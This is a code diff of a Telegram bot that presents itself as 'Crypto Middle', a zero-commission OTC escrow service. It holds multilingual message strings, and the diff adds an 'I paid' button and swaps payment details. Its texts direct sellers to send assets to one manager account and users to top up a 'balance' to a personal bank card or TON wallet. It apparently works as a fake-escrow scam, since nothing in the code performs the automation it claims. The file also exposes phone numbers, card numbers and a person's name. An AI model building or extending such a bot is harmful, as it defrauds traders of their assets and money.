@@ -1,6 +1,6 @@
 import asyncio
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
+from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
@@ -12,7 +12,7 @@ ADMIN_IDS = [174415647]
 MIDDLE_USERNAME = "@hostelman"
 SUPPORT_USERNAME = "@hostelman"
 TON_ADDRESS = "UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc"
-CARD_BANK = "ВТБ Банк | +89041751408 втб Александр И."
+CARD_INFO = "ВТБ Банк | +89041751408 Александр Ф."
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -44,6 +44,7 @@ LANGS = {
         "btn_menu": "📱 В меню",
         "btn_cancel": "❌ Отмена",
         "btn_confirm_agreement": "📍 Подтвердить Ознакомление",
+        "btn_paid": "💸 Я оплатил",
         "agreement": (
             "☑️ <b>Пользовательское соглашение</b>\n\n"
             "🛡️ Для сохранности ваших активов строго соблюдайте регламент:\n\n"
@@ -55,8 +56,8 @@ LANGS = {
             "Вывод производится автоматически после подтверждения получения.\n\n"
             "Нажмите кнопку ниже для подтверждения."
         ),
-        "deal_step1": "📝 <b>Создание сделки — Шаг 1/4</b>\n\nВведите <b>@username второго участника сделки</b> (покупателя/продавца):\n\nПример: <code>@username</code>",
-        "deal_step2": "📝 <b>Создание сделки — Шаг 2/4</b>\n\nВведите <b>суть сделки</b> (что продаёте/покупаете):",
+        "deal_step1": "📝 <b>Создание сделки — Шаг 1/4</b>\n\nВведите <b>@username второго участника сделки</b>:\n\nПример: <code>@username</code>",
+        "deal_step2": "📝 <b>Создание сделки — Шаг 2/4</b>\n\nВведите <b>суть сделки</b>:",
         "deal_step3": "📝 <b>Создание сделки — Шаг 3/4</b>\n\nВведите <b>сумму сделки</b>:",
         "deal_step4": "📝 <b>Создание сделки — Шаг 4/4</b>\n\nВ чём хотите получить оплату?",
         "deal_created": (
@@ -99,6 +100,9 @@ LANGS = {
         "own_deal": "⚠️ Это ваша собственная сделка.",
         "deal_not_found": "❌ Сделка не найдена или уже завершена.",
         "partner_notified": "👤 По вашей сделке <code>{deal_id}</code> перешёл: <b>{buyer}</b>",
+        "paid_notify_admin": "💸 <b>Пользователь сообщил об оплате</b>\n\n🆔 Сделка: <code>{deal_id}</code>\n👤 {user}\n💵 {amount} {currency}",
+        "paid_notify_seller": "💸 <b>Покупатель сообщил об оплате</b> по сделке <code>{deal_id}</code>\n\nМенеджер проверяет оплату и передаст актив.",
+        "paid_confirm": "✅ Уведомление об оплате отправлено менеджеру.\n\nМенеджер проверит и завершит сделку.",
         "req_title": "🧾 <b>Реквизиты</b>\n\n💎 TON: <code>{ton}</code>\n💳 Карта: <code>{card}</code>\n⭐️ Stars: <code>{stars}</code>",
         "no_req": "📎 Реквизит для <b>{cur}</b> не добавлен. Добавьте и создайте сделку заново.",
         "ton_saved": "✅ TON кошелёк сохранён!",
@@ -125,11 +129,11 @@ LANGS = {
             "• Баланс пополнится автоматически.\n\n⏱ Зачисление: <b>5–15 минут</b>"
         ),
         "topup_ton": (
-            f"💎 <b>Пополнение TON</b>\n\n<code>UQBu7JOWQIU72kp4r2TG45925P5Rg1qz5wzurEWmC5lWZbTL</code>\n\n"
+            f"💎 <b>Пополнение TON</b>\n\n<code>UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc</code>\n\n"
             "После отправки напишите в поддержку: <b>@hostelman</b>\n\n⏱ Зачисление: <b>5–15 минут</b>"
         ),
         "topup_card": (
-            f"💳 <b>Пополнение картой</b>\n\nРеквизиты:\n<code>2200702126310668</code>\nОзон Банк | +79011716762\n\n"
+            f"💳 <b>Пополнение картой</b>\n\nРеквизиты:\n<b>ВТБ Банк | +89041751408 Александр Ф.</b>\n\n"
             "• Сохраните чек.\n• Обратитесь в поддержку.\n\n⏱ Зачисление: <b>5–15 минут</b>"
         ),
         "topup_nft": (
@@ -160,6 +164,7 @@ LANGS = {
         "btn_menu": "📱 Menu",
         "btn_cancel": "❌ Cancel",
         "btn_confirm_agreement": "📍 Confirm Agreement",
+        "btn_paid": "💸 I Paid",
         "agreement": (
             "☑️ <b>User Agreement</b>\n\n"
             "🛡️ To protect your assets, follow the rules:\n\n"
@@ -171,8 +176,8 @@ LANGS = {
             "Withdrawal is processed automatically after confirmation.\n\n"
             "Press the button below to confirm."
         ),
-        "deal_step1": "📝 <b>Create Deal — Step 1/4</b>\n\nEnter the <b>@username of the second participant</b> (buyer/seller):\n\nExample: <code>@username</code>",
-        "deal_step2": "📝 <b>Create Deal — Step 2/4</b>\n\nDescribe the <b>deal</b> (what you're buying/selling):",
+        "deal_step1": "📝 <b>Create Deal — Step 1/4</b>\n\nEnter the <b>@username of the second participant</b>:\n\nExample: <code>@username</code>",
+        "deal_step2": "📝 <b>Create Deal — Step 2/4</b>\n\nDescribe the <b>deal</b>:",
         "deal_step3": "📝 <b>Create Deal — Step 3/4</b>\n\nEnter the <b>deal amount</b>:",
         "deal_step4": "📝 <b>Create Deal — Step 4/4</b>\n\nWhat currency do you want to receive?",
         "deal_created": (
@@ -182,15 +187,14 @@ LANGS = {
             "📋 Description: {description}\n"
             "💵 Amount: {amount}\n"
             "💱 Currency: {currency}\n"
-            "🔗 Link for participant: <code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
+            "🔗 Link: <code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
-            "📦 <b>HOW THE DEAL WORKS:</b>\n\n"
             "1️⃣ Seller transfers asset to manager: <b>@hostelman</b>\n"
-            "2️⃣ Manager confirms receipt within <b>5 minutes</b>\n"
+            "2️⃣ Manager confirms within <b>5 minutes</b>\n"
             "3️⃣ Buyer sends payment\n"
-            "4️⃣ Manager verifies and releases the asset\n\n"
-            "⚠️ Never transfer assets directly — only through @hostelman\n"
-            "⏱ Average deal time: <b>5–15 minutes</b>\n"
+            "4️⃣ Manager verifies and releases asset\n\n"
+            "⚠️ Never transfer directly — only through @hostelman\n"
+            "⏱ Average time: <b>5–15 minutes</b>\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
             "⏳ Status: <b>Active</b>"
         ),
@@ -202,21 +206,23 @@ LANGS = {
             "💱 Currency: {currency}\n"
             "🔘 Status: <b>Active</b>\n\n"
             "━━━━━━━━━━━━━━━━━━━━\n"
-            "📦 <b>HOW THE DEAL WORKS:</b>\n\n"
             "1️⃣ Seller transfers asset to manager: <b>@hostelman</b>\n"
             "2️⃣ Manager confirms within <b>5 minutes</b>\n"
             "3️⃣ Buyer sends payment\n"
-            "4️⃣ Manager verifies and closes the deal\n\n"
-            "⚠️ Transfer assets only through @hostelman\n"
-            "⏱ Average time: <b>5–15 minutes</b>\n"
+            "4️⃣ Manager verifies and closes deal\n\n"
+            "⚠️ Transfer only through @hostelman\n"
+            "⏱ Average: <b>5–15 minutes</b>\n"
             "━━━━━━━━━━━━━━━━━━━━"
         ),
         "btn_write_middle": "💬 Write to Manager",
         "own_deal": "⚠️ This is your own deal.",
         "deal_not_found": "❌ Deal not found or already closed.",
         "partner_notified": "👤 User <b>{buyer}</b> joined your deal <code>{deal_id}</code>",
+        "paid_notify_admin": "💸 <b>User reported payment</b>\n\n🆔 Deal: <code>{deal_id}</code>\n👤 {user}\n💵 {amount} {currency}",
+        "paid_notify_seller": "💸 <b>Buyer reported payment</b> for deal <code>{deal_id}</code>\n\nManager is verifying payment.",
+        "paid_confirm": "✅ Payment notification sent to manager.",
         "req_title": "🧾 <b>Requisites</b>\n\n💎 TON: <code>{ton}</code>\n💳 Card: <code>{card}</code>\n⭐️ Stars: <code>{stars}</code>",
-        "no_req": "📎 Requisite for <b>{cur}</b> not added. Add it and create the deal again.",
+        "no_req": "📎 Requisite for <b>{cur}</b> not added.",
         "ton_saved": "✅ TON wallet saved!",
         "card_saved": "✅ Card saved!",
         "stars_saved": "✅ Stars username saved!",
@@ -225,343 +231,35 @@ LANGS = {
         "enter_card": "💳 Enter your <b>card number</b>:",
         "enter_stars": "⭐️ Enter your <b>Telegram username</b> for Stars:",
         "topup_title": "💰 <b>Top Up Balance</b>\n\nChoose method:",
-        "withdraw_text": "💸 <b>Withdrawal</b>\n\nContact support:\n👤 @hostelman\n\n⚠️ Specify amount and requisites.",
+        "withdraw_text": "💸 <b>Withdrawal</b>\n\nContact support:\n👤 @hostelman",
         "security": (
             "🛡 <b>ASSET TRANSFER SECURITY</b>\n\n"
             "Transfer exclusively through: <b>@hostelman</b>\n\n"
-            "<b>• No direct transactions:</b> assets are never sent directly.\n"
-            "<b>• Verification:</b> check the amount and deal tag.\n"
-            "<b>• Completion:</b> withdrawal after both sides confirm."
+            "<b>• No direct transactions.</b>\n"
+            "<b>• Verification:</b> check amount and deal tag.\n"
+            "<b>• Completion:</b> after both sides confirm."
         ),
         "lang_choose": "🌐 <b>Choose language:</b>",
         "lang_set": "✅ Language set: English 🇬🇧",
-        "topup_stars": "⭐️ <b>Top Up with Stars</b>\n\nSend Stars to: <b>@hostelman</b>\n\n• Open the dialog and send Stars.\n• Balance will be credited automatically.\n\n⏱ Processing: <b>5–15 minutes</b>",
-        "topup_ton": f"💎 <b>Top Up with TON</b>\n\n<code>UQBu7JOWQIU72kp4r2TG45925P5Rg1qz5wzurEWmC5lWZbTL</code>\n\nAfter sending, contact support: <b>@hostelman</b>\n\n⏱ Processing: <b>5–15 minutes</b>",
-        "topup_card": f"💳 <b>Top Up with Card</b>\n\nDetails:\n<code>2200702126310668</code>\nОзон Банк | +79011716762\n\n• Save your receipt.\n• Contact support.\n\n⏱ Processing: <b>5–15 minutes</b>",
-        "topup_nft": "🎁 <b>Top Up with NFT</b>\n\nTransfer asset to: <b>@hostelman</b>\n\n• After verification, valued in Stars or TON.\n\n⏱ Processing: <b>5–15 minutes</b>",
-        "invalid_username": "❌ Enter a valid @username (must start with @):",
-    },
-    "az": {
-        "flag": "🇦🇿", "name": "Azərbaycanca",
-        "welcome": (
-            "Xoş gəldiniz 👋\n\n"
-            "💼 <b>Crypto Middle</b> — təhlükəsiz OTC sövdələşmə xidməti.\n\n"
-            "✨ Avtomatlaşdırılmış icra.\n"
-            "⚡️ Sürət və avtomatlaşdırma.\n"
-            "💳 Rahat çıxarış.\n\n"
-            "• Komissiya: <b>0%</b>\n"
-            "• İş rejimi: <b>24/7</b>\n"
-            "• Dəstək: <b>@hostelman</b>"
-        ),
-        "btn_deal": "🔐 Sövdələşmə Yarat",
-        "btn_req": "🧾 Rekvizitlər",
-        "btn_topup": "💰 Balansı Artır",
-        "btn_withdraw": "💸 Çıxarış",
-        "btn_security": "🛡 Təhlükəsizlik",
-        "btn_support": "📋 Dəstək",
-        "btn_language": "🌐 Dil",
-        "btn_menu": "📱 Menyu",
-        "btn_cancel": "❌ Ləğv et",
-        "btn_confirm_agreement": "📍 Razılığı Təsdiqləyin",
-        "agreement": "☑️ <b>İstifadəçi Razılaşması</b>\n\nAktivlər yalnız: <b>@hostelman</b> vasitəsilə ötürülür.\n\nBirbaşa ödəniş qadağandır.\n\nAşağıdakı düyməni basın.",
-        "deal_step1": "📝 <b>Sövdələşmə — Addım 1/4</b>\n\nİkinci iştirakçının <b>@username</b>-ni daxil edin:",
-        "deal_step2": "📝 <b>Sövdələşmə — Addım 2/4</b>\n\n<b>Sövdələşmənin mahiyyətini</b> daxil edin:",
-        "deal_step3": "📝 <b>Sövdələşmə — Addım 3/4</b>\n\n<b>Məbləği</b> daxil edin:",
-        "deal_step4": "📝 <b>Sövdələşmə — Addım 4/4</b>\n\nHansı valyutada almaq istərsiniz?",
-        "deal_created": (
-            "✅ <b>Sövdələşmə yaradıldı!</b>\n\n"
-            "🆔 ID: <code>{deal_id}</code>\n"
-            "👤 İkinci iştirakçı: <b>{partner}</b>\n"
-            "📋 Məzmun: {description}\n"
-            "💵 Məbləğ: {amount}\n"
-            "💱 Valyuta: {currency}\n"
-            "🔗 Link: <code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "1️⃣ Satıcı aktivi menecerə göndərir: <b>@hostelman</b>\n"
-            "2️⃣ Menecer <b>5 dəqiqə</b> ərzində təsdiqləyir\n"
-            "3️⃣ Alıcı ödəniş göndərir\n"
-            "4️⃣ Menecer doğrulayır və aktivi ötürür\n\n"
-            "⚠️ Aktivləri yalnız @hostelman vasitəsilə ötürün\n"
-            "⏱ Orta müddət: <b>5–15 dəqiqə</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "⏳ Status: <b>Aktiv</b>"
-        ),
-        "deal_info": (
-            "📋 <b>Sövdələşmə Məlumatı</b>\n\n"
-            "🆔 ID: <code>{deal_id}</code>\n"
-            "📝 Məzmun: {description}\n"
-            "💵 Məbləğ: {amount}\n"
-            "💱 Valyuta: {currency}\n\n"
-            "1️⃣ Satıcı aktivi menecerə göndərir: <b>@hostelman</b>\n"
-            "2️⃣ Menecer <b>5 dəqiqə</b> ərzində təsdiqləyir\n"
-            "⚠️ Yalnız @hostelman vasitəsilə\n"
-            "⏱ Orta müddət: <b>5–15 dəqiqə</b>"
-        ),
-        "btn_write_middle": "💬 Menecerə Yaz",
-        "own_deal": "⚠️ Bu sizin öz sövdələşmənizdır.",
-        "deal_not_found": "❌ Sövdələşmə tapılmadı.",
-        "partner_notified": "👤 İstifadəçi <b>{buyer}</b> sövdələşməyə qoşuldu <code>{deal_id}</code>",
-        "req_title": "🧾 <b>Rekvizitlər</b>\n\n💎 TON: <code>{ton}</code>\n💳 Kart: <code>{card}</code>\n⭐️ Stars: <code>{stars}</code>",
-        "no_req": "📎 <b>{cur}</b> üçün rekvizit əlavə edilməyib.",
-        "ton_saved": "✅ TON cüzdanı saxlanıldı!",
-        "card_saved": "✅ Kart saxlanıldı!",
-        "stars_saved": "✅ Stars username saxlanıldı!",
-        "redo_deal": "\n\nİndi sövdələşməni yenidən yaradın.",
-        "enter_ton": "💎 <b>TON cüzdanınızı</b> daxil edin:",
-        "enter_card": "💳 <b>Kart nömrəsini</b> daxil edin:",
-        "enter_stars": "⭐️ Stars üçün <b>Telegram username</b>-nizi daxil edin:",
-        "topup_title": "💰 <b>Balansı Artır</b>\n\nÜsul seçin:",
-        "withdraw_text": "💸 <b>Çıxarış</b>\n\nDəstəklə əlaqə saxlayın:\n👤 @hostelman",
-        "security": "🛡 <b>Təhlükəsizlik</b>\n\nAktivlər yalnız @hostelman vasitəsilə ötürülür.",
-        "lang_choose": "🌐 <b>Dil seçin:</b>",
-        "lang_set": "✅ Dil təyin edildi: Azərbaycanca 🇦🇿",
-        "topup_stars": "⭐️ Stars göndərin: <b>@hostelman</b>\n\n⏱ <b>5–15 dəqiqə</b>",
-        "topup_ton": f"💎 TON ünvanı:\n<code>UQBu7JOWQIU72kp4r2TG45925P5Rg1qz5wzurEWmC5lWZbTL</code>\n\n@hostelman\n\n⏱ <b>5–15 dəqiqə</b>",
-        "topup_card": f"💳 Kart:\n<code>2200702126310668</code>\nОзон Банк | +79011716762\n\n⏱ <b>5–15 dəqiqə</b>",
-        "topup_nft": "🎁 NFT göndərin: <b>@hostelman</b>\n\n⏱ <b>5–15 dəqiqə</b>",
-        "invalid_username": "❌ Düzgün @username daxil edin:",
-    },
-    "tr": {
-        "flag": "🇹🇷", "name": "Türkçe",
-        "welcome": (
-            "Hoş geldiniz 👋\n\n"
-            "💼 <b>Crypto Middle</b> — güvenli OTC işlem hizmeti.\n\n"
-            "✨ Otomatik yürütme.\n"
-            "⚡️ Hız ve otomasyon.\n"
-            "💳 Hızlı çekim.\n\n"
-            "• Komisyon: <b>0%</b>\n"
-            "• Çalışma saatleri: <b>24/7</b>\n"
-            "• Destek: <b>@hostelman</b>"
-        ),
-        "btn_deal": "🔐 Anlaşma Oluştur",
-        "btn_req": "🧾 Ödeme Bilgileri",
-        "btn_topup": "💰 Bakiye Yükle",
-        "btn_withdraw": "💸 Para Çek",
-        "btn_security": "🛡 Güvenlik",
-        "btn_support": "📋 Destek",
-        "btn_language": "🌐 Dil",
-        "btn_menu": "📱 Menü",
-        "btn_cancel": "❌ İptal",
-        "btn_confirm_agreement": "📍 Sözleşmeyi Onayla",
-        "agreement": "☑️ <b>Kullanıcı Sözleşmesi</b>\n\nVarlıklar yalnızca: <b>@hostelman</b> üzerinden transfer edilir.\n\nDoğrudan ödeme yasaktır.\n\nOnaylamak için butona basın.",
-        "deal_step1": "📝 <b>Anlaşma — Adım 1/4</b>\n\nİkinci katılımcının <b>@username</b>'ini girin:",
-        "deal_step2": "📝 <b>Anlaşma — Adım 2/4</b>\n\n<b>Anlaşmanın konusunu</b> girin:",
-        "deal_step3": "📝 <b>Anlaşma — Adım 3/4</b>\n\n<b>Tutarı</b> girin:",
-        "deal_step4": "📝 <b>Anlaşma — Adım 4/4</b>\n\nHangi para biriminde almak istiyorsunuz?",
-        "deal_created": (
-            "✅ <b>Anlaşma oluşturuldu!</b>\n\n"
-            "🆔 ID: <code>{deal_id}</code>\n"
-            "👤 İkinci katılımcı: <b>{partner}</b>\n"
-            "📋 Konu: {description}\n"
-            "💵 Tutar: {amount}\n"
-            "💱 Para birimi: {currency}\n"
-            "🔗 Link: <code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "1️⃣ Satıcı varlığı yöneticiye gönderir: <b>@hostelman</b>\n"
-            "2️⃣ Yönetici <b>5 dakika</b> içinde onaylar\n"
-            "3️⃣ Alıcı ödeme gönderir\n"
-            "4️⃣ Yönetici doğrular ve varlığı teslim eder\n\n"
-            "⚠️ Varlıkları yalnızca @hostelman üzerinden gönderin\n"
-            "⏱ Ortalama süre: <b>5–15 dakika</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "⏳ Durum: <b>Aktif</b>"
-        ),
-        "deal_info": (
-            "📋 <b>Anlaşma Bilgisi</b>\n\n"
-            "🆔 ID: <code>{deal_id}</code>\n"
-            "📝 Konu: {description}\n"
-            "💵 Tutar: {amount}\n"
-            "💱 Para birimi: {currency}\n\n"
-            "1️⃣ Satıcı varlığı yöneticiye gönderir: <b>@hostelman</b>\n"
-            "2️⃣ Yönetici <b>5 dakika</b> içinde onaylar\n"
-            "⚠️ Yalnızca @hostelman üzerinden\n"
-            "⏱ Ortalama: <b>5–15 dakika</b>"
-        ),
-        "btn_write_middle": "💬 Yöneticiye Yaz",
-        "own_deal": "⚠️ Bu sizin kendi anlaşmanız.",
-        "deal_not_found": "❌ Anlaşma bulunamadı.",
-        "partner_notified": "👤 Kullanıcı <b>{buyer}</b> anlaşmaya katıldı <code>{deal_id}</code>",
-        "req_title": "🧾 <b>Ödeme Bilgileri</b>\n\n💎 TON: <code>{ton}</code>\n💳 Kart: <code>{card}</code>\n⭐️ Stars: <code>{stars}</code>",
-        "no_req": "📎 <b>{cur}</b> için ödeme bilgisi eklenmedi.",
-        "ton_saved": "✅ TON cüzdanı kaydedildi!",
-        "card_saved": "✅ Kart kaydedildi!",
-        "stars_saved": "✅ Stars kullanıcı adı kaydedildi!",
-        "redo_deal": "\n\nŞimdi anlaşmayı yeniden oluşturun.",
-        "enter_ton": "💎 <b>TON cüzdanınızı</b> girin:",
-        "enter_card": "💳 <b>Kart numaranızı</b> girin:",
-        "enter_stars": "⭐️ Stars için <b>Telegram kullanıcı adını</b> girin:",
-        "topup_title": "💰 <b>Bakiye Yükle</b>\n\nYöntem seçin:",
-        "withdraw_text": "💸 <b>Para Çekme</b>\n\nDestekle iletişime geçin:\n👤 @hostelman",
-        "security": "🛡 <b>Güvenlik</b>\n\nVarlıklar yalnızca @hostelman üzerinden transfer edilir.",
-        "lang_choose": "🌐 <b>Dil seçin:</b>",
-        "lang_set": "✅ Dil ayarlandı: Türkçe 🇹🇷",
-        "topup_stars": "⭐️ Stars gönderin: <b>@hostelman</b>\n\n⏱ <b>5–15 dakika</b>",
-        "topup_ton": f"💎 TON adresi:\n<code>UQBu7JOWQIU72kp4r2TG45925P5Rg1qz5wzurEWmC5lWZbTL</code>\n\n@hostelman\n\n⏱ <b>5–15 dakika</b>",
-        "topup_card": f"💳 Kart:\n<code>2200702126310668</code>\nОзон Банк | +79011716762\n\n⏱ <b>5–15 dakika</b>",
-        "topup_nft": "🎁 NFT gönderin: <b>@hostelman</b>\n\n⏱ <b>5–15 dakika</b>",
-        "invalid_username": "❌ Geçerli bir @username girin:",
-    },
-    "kz": {
-        "flag": "🇰🇿", "name": "Қазақша",
-        "welcome": (
-            "Қош келдіңіз 👋\n\n"
-            "💼 <b>Crypto Middle</b> — қауіпсіз OTC мәмілелер қызметі.\n\n"
-            "✨ Автоматтандырылған орындау.\n"
-            "⚡️ Жылдамдық және автоматтандыру.\n"
-            "💳 Ыңғайлы шығару.\n\n"
-            "• Комиссия: <b>0%</b>\n"
-            "• Жұмыс уақыты: <b>24/7</b>\n"
-            "• Қолдау: <b>@hostelman</b>"
-        ),
-        "btn_deal": "🔐 Мәміле Жасау",
-        "btn_req": "🧾 Реквизиттер",
-        "btn_topup": "💰 Балансты Толтыру",
-        "btn_withdraw": "💸 Шығару",
-        "btn_security": "🛡 Қауіпсіздік",
-        "btn_support": "📋 Қолдау",
-        "btn_language": "🌐 Тіл",
-        "btn_menu": "📱 Мәзір",
-        "btn_cancel": "❌ Болдырмау",
-        "btn_confirm_agreement": "📍 Келісімді Растау",
-        "agreement": "☑️ <b>Пайдаланушы келісімі</b>\n\nАктивтер тек: <b>@hostelman</b> арқылы беріледі.\n\nТікелей төлем қадаған.\n\nРастау үшін батырманы басыңыз.",
-        "deal_step1": "📝 <b>Мәміле — Қадам 1/4</b>\n\nЕкінші қатысушының <b>@username</b>-ін енгізіңіз:",
-        "deal_step2": "📝 <b>Мәміле — Қадам 2/4</b>\n\n<b>Мәміленің мәнін</b> енгізіңіз:",
-        "deal_step3": "📝 <b>Мәміле — Қадам 3/4</b>\n\n<b>Сомасын</b> енгізіңіз:",
-        "deal_step4": "📝 <b>Мәміле — Қадам 4/4</b>\n\nҚандай валютада алғыңыз келеді?",
-        "deal_created": (
-            "✅ <b>Мәміле жасалды!</b>\n\n"
-            "🆔 ID: <code>{deal_id}</code>\n"
-            "👤 Екінші қатысушы: <b>{partner}</b>\n"
-            "📋 Мән: {description}\n"
-            "💵 Сома: {amount}\n"
-            "💱 Валюта: {currency}\n"
-            "🔗 Сілтеме: <code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "1️⃣ Сатушы активті менеджерге жібереді: <b>@hostelman</b>\n"
-            "2️⃣ Менеджер <b>5 минут</b> ішінде растайды\n"
-            "3️⃣ Сатып алушы төлем жібереді\n"
-            "4️⃣ Менеджер тексеріп активті береді\n\n"
-            "⚠️ Активтерді тек @hostelman арқылы жіберіңіз\n"
-            "⏱ Орташа уақыт: <b>5–15 минут</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "⏳ Күй: <b>Белсенді</b>"
-        ),
-        "deal_info": (
-            "📋 <b>Мәміле туралы ақпарат</b>\n\n"
-            "🆔 ID: <code>{deal_id}</code>\n"
-            "📝 Мән: {description}\n"
-            "💵 Сома: {amount}\n"
-            "💱 Валюта: {currency}\n\n"
-            "1️⃣ Сатушы активті менеджерге жібереді: <b>@hostelman</b>\n"
-            "2️⃣ Менеджер <b>5 минут</b> ішінде растайды\n"
-            "⚠️ Тек @hostelman арқылы\n"
-            "⏱ Орташа: <b>5–15 минут</b>"
-        ),
-        "btn_write_middle": "💬 Менеджерге Жаз",
-        "own_deal": "⚠️ Бұл сіздің өз мәмілеңіз.",
-        "deal_not_found": "❌ Мәміле табылмады.",
-        "partner_notified": "👤 Пайдаланушы <b>{buyer}</b> мәмілеге қосылды <code>{deal_id}</code>",
-        "req_title": "🧾 <b>Реквизиттер</b>\n\n💎 TON: <code>{ton}</code>\n💳 Карта: <code>{card}</code>\n⭐️ Stars: <code>{stars}</code>",
-        "no_req": "📎 <b>{cur}</b> үшін реквізит қосылмаған.",
-        "ton_saved": "✅ TON әмиян сақталды!",
-        "card_saved": "✅ Карта сақталды!",
-        "stars_saved": "✅ Stars username сақталды!",
-        "redo_deal": "\n\nЕнді мәмілені қайта жасаңыз.",
-        "enter_ton": "💎 <b>TON әмияныңызды</b> енгізіңіз:",
-        "enter_card": "💳 <b>Карта нөмірін</b> енгізіңіз:",
-        "enter_stars": "⭐️ Stars үшін <b>Telegram username</b>-іңізді енгізіңіз:",
-        "topup_title": "💰 <b>Балансты Толтыру</b>\n\nТәсілді таңдаңыз:",
-        "withdraw_text": "💸 <b>Шығару</b>\n\nҚолдаумен байланысыңыз:\n👤 @hostelman",
-        "security": "🛡 <b>Қауіпсіздік</b>\n\nАктивтер тек @hostelman арқылы беріледі.",
-        "lang_choose": "🌐 <b>Тілді таңдаңыз:</b>",
-        "lang_set": "✅ Тіл орнатылды: Қазақша 🇰🇿",
-        "topup_stars": "⭐️ Stars жіберіңіз: <b>@hostelman</b>\n\n⏱ <b>5–15 минут</b>",
-        "topup_ton": f"💎 TON мекенжайы:\n<code>UQBu7JOWQIU72kp4r2TG45925P5Rg1qz5wzurEWmC5lWZbTL</code>\n\n@hostelman\n\n⏱ <b>5–15 минут</b>",
-        "topup_card": f"💳 Карта:\n<code>2200702126310668</code>\nОзон Банк | +79011716762\n\n⏱ <b>5–15 минут</b>",
-        "topup_nft": "🎁 NFT жіберіңіз: <b>@hostelman</b>\n\n⏱ <b>5–15 минут</b>",
-        "invalid_username": "❌ Дұрыс @username енгізіңіз:",
-    },
-    "ua": {
-        "flag": "🇺🇦", "name": "Українська",
-        "welcome": (
-            "Ласкаво просимо 👋\n\n"
-            "💼 <b>Crypto Middle</b> — безпечний OTC сервіс угод.\n\n"
-            "✨ Автоматизоване виконання.\n"
-            "⚡️ Швидкість та автоматизація.\n"
-            "💳 Зручне виведення.\n\n"
-            "• Комісія: <b>0%</b>\n"
-            "• Режим роботи: <b>24/7</b>\n"
-            "• Підтримка: <b>@hostelman</b>"
-        ),
-        "btn_deal": "🔐 Створити Угоду",
-        "btn_req": "🧾 Реквізити",
-        "btn_topup": "💰 Поповнити Баланс",
-        "btn_withdraw": "💸 Вивести Кошти",
-        "btn_security": "🛡 Безпека",
-        "btn_support": "📋 Підтримка",
-        "btn_language": "🌐 Мова",
-        "btn_menu": "📱 Меню",
-        "btn_cancel": "❌ Скасувати",
-        "btn_confirm_agreement": "📍 Підтвердити Ознайомлення",
-        "agreement": "☑️ <b>Угода користувача</b>\n\nАктиви передаються лише через: <b>@hostelman</b>\n\nПрямі платежі заборонені.\n\nНатисніть кнопку нижче.",
-        "deal_step1": "📝 <b>Угода — Крок 1/4</b>\n\nВведіть <b>@username другого учасника</b>:",
-        "deal_step2": "📝 <b>Угода — Крок 2/4</b>\n\nВведіть <b>суть угоди</b>:",
-        "deal_step3": "📝 <b>Угода — Крок 3/4</b>\n\nВведіть <b>суму угоди</b>:",
-        "deal_step4": "📝 <b>Угода — Крок 4/4</b>\n\nУ якій валюті бажаєте отримати?",
-        "deal_created": (
-            "✅ <b>Угоду створено!</b>\n\n"
-            "🆔 ID: <code>{deal_id}</code>\n"
-            "👤 Другий учасник: <b>{partner}</b>\n"
-            "📋 Суть: {description}\n"
-            "💵 Сума: {amount}\n"
-            "💱 Валюта: {currency}\n"
-            "🔗 Посилання: <code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "1️⃣ Продавець передає актив менеджеру: <b>@hostelman</b>\n"
-            "2️⃣ Менеджер підтверджує протягом <b>5 хвилин</b>\n"
-            "3️⃣ Покупець надсилає оплату\n"
-            "4️⃣ Менеджер верифікує та передає актив\n\n"
-            "⚠️ Передавайте активи лише через @hostelman\n"
-            "⏱ Середній час: <b>5–15 хвилин</b>\n"
-            "━━━━━━━━━━━━━━━━━━━━\n"
-            "⏳ Статус: <b>Активна</b>"
-        ),
-        "deal_info": (
-            "📋 <b>Інформація про угоду</b>\n\n"
-            "🆔 ID: <code>{deal_id}</code>\n"
-            "📝 Суть: {description}\n"
-            "💵 Сума: {amount}\n"
-            "💱 Валюта: {currency}\n\n"
-            "1️⃣ Продавець передає актив менеджеру: <b>@hostelman</b>\n"
-            "2️⃣ Менеджер підтверджує протягом <b>5 хвилин</b>\n"
-            "⚠️ Лише через @hostelman\n"
-            "⏱ Середній час: <b>5–15 хвилин</b>"
-        ),
-        "btn_write_middle": "💬 Написати менеджеру",
-        "own_deal": "⚠️ Це ваша власна угода.",
-        "deal_not_found": "❌ Угоду не знайдено.",
-        "partner_notified": "👤 Користувач <b>{buyer}</b> приєднався до угоди <code>{deal_id}</code>",
-        "req_title": "🧾 <b>Реквізити</b>\n\n💎 TON: <code>{ton}</code>\n💳 Картка: <code>{card}</code>\n⭐️ Stars: <code>{stars}</code>",
-        "no_req": "📎 Реквізит для <b>{cur}</b> не додано.",
-        "ton_saved": "✅ TON гаманець збережено!",
-        "card_saved": "✅ Картку збережено!",
-        "stars_saved": "✅ Username для Stars збережено!",
-        "redo_deal": "\n\nТепер створіть угоду знову.",
-        "enter_ton": "💎 Введіть ваш <b>TON гаманець</b>:",
-        "enter_card": "💳 Введіть <b>номер картки</b>:",
